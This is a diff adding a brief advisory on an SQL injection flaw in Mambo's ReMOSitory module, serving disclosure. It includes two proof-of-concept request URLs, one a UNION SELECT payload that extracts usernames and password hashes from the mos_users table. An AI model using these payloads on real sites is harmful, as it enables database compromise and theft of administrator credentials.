@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/11219/info
+
+It is reported that the ReMOSitory module for Mambo is prone to an SQL injection vulnerability. This issue is due to a failure of the module to properly validate user supplied URI input.
+
+Because of this, a malicious user may influence database queries in order to view or modify sensitive information, potentially compromising the software or the database. It may be possible for an attacker to disclose the administrator password hash by exploiting this issue.
+
+http://www.example.com/index.php?option=com_remository&Itemid=27&func=fileinfo&parent=folder&filecatid=499%20and%201=0[SQL]/*
+http://www.example.com/index.php?option=com_remository&Itemid=[id]&func=selectfolder&filecatid=[id]%20and%201=0%20union%20all%20select%201,2,3,4,username,6,password,8,9
+,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20from%20mos_users%20where%20usertype=0/*
